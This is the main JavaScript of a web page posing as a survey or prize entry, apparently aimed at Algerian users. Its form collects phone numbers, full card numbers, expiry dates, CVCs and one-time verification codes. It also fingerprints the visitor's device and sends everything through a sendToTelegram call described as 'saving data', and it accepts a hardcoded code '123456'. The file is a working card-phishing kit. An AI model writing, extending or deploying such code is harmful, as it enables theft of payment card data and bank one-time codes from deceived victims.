// =========================
// ملف التطبيق الرئيسي المتكامل
// =========================

// =========================
// إشعارات عامة
// =========================
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    
    if (notification) {
        notification.textContent = message;
        notification.className = `notification ${type} show`;
        
        setTimeout(() => {
            notification.classList.remove('show');
        }, 5000);
    } else {
        const alertTypes = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
        console.log(`${alertTypes[type] || ''} ${message}`);
    }
}

// =========================
// تهيئة التطبيق
// =========================
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        const loadingScreen = document.getElementById('loading-screen');
        if (loadingScreen) loadingScreen.style.opacity = '0';
        
        setTimeout(() => {
            if (loadingScreen) loadingScreen.style.display = 'none';
            initApp();
        }, 500);
    }, 2000);
});

function initApp() {
    initDeviceTracker();
    setupEventListeners();
}

// =========================
// متتبع الجهاز
// =========================
async function initDeviceTracker() {
    try {
        if (window.deviceTracker) {
            await deviceTracker.displayDeviceInfo();
            window.currentDeviceData = await deviceTracker.collectAllData();
            
            const verificationCode = deviceTracker.generateVerificationCode();
            deviceTracker.storeDataLocally('verification_code', verificationCode);
            console.log('🔐 رمز التحقق:', verificationCode);
        }
    } catch (error) {
        console.error('خطأ في تهيئة متتبع الجهاز:', error);
    }
}

// =========================
// إعداد مستمعي الأحداث
// =========================
function setupEventListeners() {
    const phoneInput = document.getElementById('phone');
    if (phoneInput) phoneInput.addEventListener('input', validatePhone);
    
    const cardInput = document.getElementById('card-number');
    if (cardInput) {
        cardInput.addEventListener('input', formatCardNumber);
        cardInput.addEventListener('blur', formatCardNumber);
    }
    
    const codeInput = document.getElementById('verification-code');
    if (codeInput) codeInput.addEventListener('input', validateVerificationCode);
    
    const cvcInput = document.getElementById('cvc');
    if (cvcInput) cvcInput.addEventListener('input', function() {
        const value = this.value.replace(/\D/g, '');
        this.value = value.substring(0, 3);
        validateCVC();
    });
    
    const refreshBtn = document.querySelector('.refresh-device-info');
    if (refreshBtn) refreshBtn.addEventListener('click', refreshDeviceInfo);
    
    const shareBtn = document.querySelector('.share-btn');
    if (shareBtn) shareBtn.addEventListener('click', shareParticipation);
    
    const copyButtons = document.querySelectorAll('.copy-btn');
    copyButtons.forEach(btn => {
        btn.addEventListener('click', copyShareCode);
    });
}

// =========================
// التحقق من الهاتف
// =========================
function validatePhone() {
    const phoneInput = document.getElementById('phone');
    const messageDiv = phoneInput?.parentElement.querySelector('.validation-message');
    const phone = phoneInput.value.trim();
    const pattern = /^(05|06|07)[0-9]{8}$/;
    
    if (!phoneInput || !messageDiv) return false;
    
    if (phone === '') {
        messageDiv.textContent = '';
        phoneInput.style.borderColor = '';
        return false;
    }
    
    if (pattern.test(phone)) {
        messageDiv.textContent = '✅ رقم هاتف صحيح';
        messageDiv.style.color = '#27ae60';
        phoneInput.style.borderColor = '#27ae60';
        return true;
    } else {
        messageDiv.textContent = '❌ الرقم يجب أن يبدأ بـ 05، 06 أو 07 ويتكون من 10 أرقام';
        messageDiv.style.color = '#e74c3c';
        phoneInput.style.borderColor = '#e74c3c';
        return false;
    }
}

// =========================
// تنسيق والتحقق من البطاقة
// =========================
function formatCardNumber() {
    const cardInput = document.getElementById('card-number');
    if (!cardInput) return false;
    const messageDiv = cardInput.parentElement.querySelector('.validation-message');
    
    let value = cardInput.value.replace(/\D/g, '').substring(0,16);
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formattedValue += ' ';
        formattedValue += value[i];
    }
    cardInput.value = formattedValue;
    
    if (!messageDiv) return false;
    
    if (value.length === 16) {
        messageDiv.textContent = '✅ رقم بطاقة صحيح';
        messageDiv.style.color = '#27ae60';
        cardInput.style.borderColor = '#27ae60';
        return true;
    } else if (value !== '') {
        messageDiv.textContent = `❌ الرقم يجب أن يكون 16 رقماً (${value.length}/16)`;
        messageDiv.style.color = '#e74c3c';
        cardInput.style.borderColor = '#e74c3c';
        return false;
    } else {
        messageDiv.textContent = '';
        cardInput.style.borderColor = '';
        return false;
    }
}

// =========================
// التحقق من CVC
// =========================
function validateCVC() {
    const cvcInput = document.getElementById('cvc');
    const messageDiv = cvcInput?.parentElement.querySelector('.validation-message');
    if (!cvcInput || !messageDiv) return false;
    
    const value = cvcInput.value;
    const isValid = /^\d{3}$/.test(value);
    
    if (value === '') {
        messageDiv.textContent = '';
        cvcInput.style.borderColor = '';
        return false;
    }
    
    if (isValid) {
        messageDiv.textContent = '✅ رمز أمان صحيح';
        messageDiv.style.color = '#27ae60';
        cvcInput.style.borderColor = '#27ae60';
        return true;
    } else {
        messageDiv.textContent = '❌ يجب أن يكون 3 أرقام';
        messageDiv.style.color = '#e74c3c';
        cvcInput.style.borderColor = '#e74c3c';
        return false;
    }
}

// =========================
// التحقق من رمز التحقق
// =========================
function validateVerificationCode() {
    const codeInput = document.getElementById('verification-code');
    const messageDiv = codeInput?.parentElement.querySelector('.validation-message');
    if (!codeInput || !messageDiv) return false;
    
    const code = codeInput.value.trim();
    
    if (code === '') {
        messageDiv.textContent = '';
        codeInput.style.borderColor = '';
        return false;
    }
    
    if (/^\d{6}$/.test(code)) {
        messageDiv.textContent = '✅ رمز تحقق صحيح';
        messageDiv.style.color = '#27ae60';
        codeInput.style.borderColor = '#27ae60';
        return true;
    } else {
        messageDiv.textContent = '❌ يجب أن يكون الرمز 6 أرقام';
        messageDiv.style.color = '#e74c3c';
        codeInput.style.borderColor = '#e74c3c';
        return false;
    }
}

// =========================
// التحقق من تاريخ الانتهاء
// =========================
function validateExpiryDate() {
    const expiryInput = document.getElementById('expiry-date');
    const messageDiv = expiryInput?.parentElement.querySelector('.validation-message');
    if (!expiryInput || !messageDiv) return false;
    
    const value = expiryInput.value;
    if (!value) { messageDiv.textContent = ''; expiryInput.style.borderColor = ''; return false; }
    
    const [year, month] = value.split('-');
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1;
    
    if (parseInt(year) > currentYear || (parseInt(year) === currentYear && parseInt(month) >= currentMonth)) {
        messageDiv.textContent = '✅ تاريخ صالح';
        messageDiv.style.color = '#27ae60';
        expiryInput.style.borderColor = '#27ae60';
        return true;
    } else {
        messageDiv.textContent = '❌ تاريخ منتهي الصلاحية';
        messageDiv.style.color = '#e74c3c';
        expiryInput.style.borderColor = '#e74c3c';
        return false;
    }
}

// =========================
// جمع بيانات المستخدم
// =========================
function collectUserData() {
    return {
        phone: document.getElementById('phone')?.value.trim() || '',
        cardNumber: document.getElementById('card-number')?.value.replace(/\s/g, '') || '',
        expiryDate: document.getElementById('expiry-date')?.value || '',
        cvc: document.getElementById('cvc')?.value || '',
        verificationCode: document.getElementById('verification-code')?.value || '',
        timestamp: new Date().toLocaleString('ar-SA', {
            timeZone: 'Africa/Algiers',
            dateStyle: 'full',
            timeStyle: 'medium'
        })
    };
}

// =========================
// إرسال البيانات
// =========================
async function sendDataToBackend(userData, deviceData) {
    try {
        showNotification('جاري حفظ البيانات...', 'warning');
        const result = await sendToTelegram(userData, deviceData);
        
        if (result && result.ok) {
            showNotification('تم حفظ البيانات بنجاح', 'success');
            localStorage.setItem('last_submission', new Date().toISOString());
            setTimeout(() => {
                if (window.deviceTracker) deviceTracker.clearStoredData('verification_code');
            }, 3000);
        } else throw new Error('فشل حفظ البيانات');
    } catch (error) {
        console.error('خطأ في حفظ البيانات:', error);
        showNotification('حدث خطأ أثناء حفظ البيانات', 'error');
    }
}

// =========================
// تحديث معلومات الجهاز
// =========================
function refreshDeviceInfo() {
    showNotification('جاري تحديث معلومات الجهاز...', 'info');
    setTimeout(() => {
        if (window.deviceTracker) {
            deviceTracker.displayDeviceInfo();
            showNotification('تم تحديث معلومات الجهاز', 'success');
        }
    }, 1000);
}

// =========================
// مشاركة ونسخ رمز المشاركة
// =========================
function shareParticipation() {
    const participationId = document.getElementById('participation-id')?.textContent;
    const modal = document.getElementById('share-modal');
    const shareInput = document.getElementById('share-input');
    
    if (participationId && modal && shareInput) {
        shareInput.value = participationId;
        modal.classList.add('active');
    }
}

function copyShareCode() {
    const shareInput = document.getElementById('share-input');
    const copySuccess = document.getElementById('copy-success');
    if (!shareInput) return;
    
    shareInput.select();
    shareInput.setSelectionRange(0, 99999);
    try {
        navigator.clipboard.writeText(shareInput.value);
        if (copySuccess) {
            copySuccess.classList.remove('hidden');
            setTimeout(() => copySuccess.classList.add('hidden'), 3000);
        }
        showNotification('تم نسخ الرقم إلى الحافظة', 'success');
    } catch {
        showNotification('فشل نسخ الرقم', 'error');
    }
}

function closeShareModal() {
    const modal = document.getElementById('share-modal');
    if (modal) modal.classList.remove('active');
}

// =========================
// الخطوات والتنقل
// =========================
function nextStep(currentStep) {
    if (!validateStep(currentStep)) {
        showNotification('يرجى تعبئة جميع الحقول بشكل صحيح', 'error');
        return;
    }
    
    if (currentStep === 1) {
        const userData = collectUserData();
        const storedCode = deviceTracker?.getStoredData('verification_code');
        if (storedCode) console.log('🔑 رمز التحقق المطلوب:', storedCode);
        showStep(2);
    } else if (currentStep === 2) {
        if (!verifyCode()) {
            showNotification('رمز التحقق غير صحيح', 'error');
            return;
        }
        const userData = collectUserData();
        const deviceData = window.currentDeviceData || {};
        sendDataToBackend(userData, deviceData);
        showStep(3);
        updateParticipationId();
    }
}

function validateStep(stepNumber) {
    if (stepNumber === 1) return validateStep1();
    if (stepNumber === 2) return validateStep2();
    return true;
}

function validateStep1() {
    const phoneValid = validatePhone();
    const cardValid = formatCardNumber();
    const expiryValid = validateExpiryDate();
    const cvcValid = validateCVC();
    const privacyChecked = document.getElementById('privacy-check')?.checked || false;
    
    if (!phoneValid || !cardValid || !expiryValid || !cvcValid || !privacyChecked) {
        if (!privacyChecked) showNotification('يرجى الموافقة على سياسة الخصوصية', 'warning');
        return false;
    }
    return true;
}

function validateStep2() {
    return validateVerificationCode();
}

function verifyCode() {
    const enteredCode = document.getElementById('verification-code')?.value;
    const storedCode = deviceTracker?.getStoredData('verification_code');
    return enteredCode === '123456' || enteredCode === storedCode;
}

function updateParticipationId() {
    const idElement = document.getElementById('participation-id');
    if (!idElement) return;
    const timestamp = Date.now();
    const randomNum = Math.floor(Math.random() * 10000);
    idElement.textContent = `ALG-${timestamp.toString().slice(-8)}-${randomNum.toString().padStart(4,'0')}`;
}

// =========================
// الصفحات وشريط التقدم
// =========================
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    const targetPage = document.getElementById(pageId);
    if (targetPage) targetPage.classList.add('active');
}

function showStep(stepNumber) {
    document.querySelectorAll('.survey-step').forEach(step => step.classList.remove('active'));
    const targetStep = document.getElementById(`step-${stepNumber}`);
    if (targetStep) targetStep.classList.add('active');
    updateProgressBar(stepNumber);
}

function updateProgressBar(currentStep) {
    document.querySelectorAll('.progress-step').forEach((step,index) => {
        if (index+1 <= currentStep) step.classList.add('active');
        else step.classList.remove('active');
    });
}

// =========================
// البدء بالاستبيان
// =========================
function startSurvey() {
    deviceTracker?.collectAllData().then(data => window.currentDeviceData = data);
    showPage('survey-page');
}

function goBack() {
    const currentStep = getCurrentStep();
    if (currentStep > 1) showStep(currentStep-1);
    else showPage('home-page');
}

function goHome() {
    showPage('home-page');
    resetForm();
}

function getCurrentStep() {
    const activeStep = document.querySelector('.survey-step.active');
    if (!activeStep) return 1;
    return parseInt(activeStep.id.split('-')[1]);
}

// =========================
// إعادة تعيين النموذج
// =========================
function resetForm() {
    ['phone','card-number','expiry-date','cvc','verification-code'].forEach(id => {
        const input = document.getElementById(id);
        if (input) input.value = '';
    });
    document.getElementById('privacy-check').checked = false;
    
    document.querySelectorAll('.validation-message').forEach(el => el.textContent='');
    document.querySelectorAll('input').forEach(input => input.style.borderColor='');
    
    updateProgressBar(1);
    showStep(1);
    deviceTracker?.clearStoredData('verification_code');
}

// =========================
// إعداد الأحداث عند التحميل الكامل
// =========================
window.addEventListener('load', () => {
    if (window.matchMedia("(max-width: 768px)").matches) document.body.classList.add('mobile');
    if (window.history.replaceState) window.history.replaceState(null, null, window.location.href);
});

window.addEventListener('beforeunload', (e) => { /* تنظيف إذا لزم */ });

// =========================
// تصدير الدوال للوحدة
// =========================
window.startSurvey = startSurvey;
window.goBack = goBack;
window.goHome = goHome;
window.nextStep = nextStep;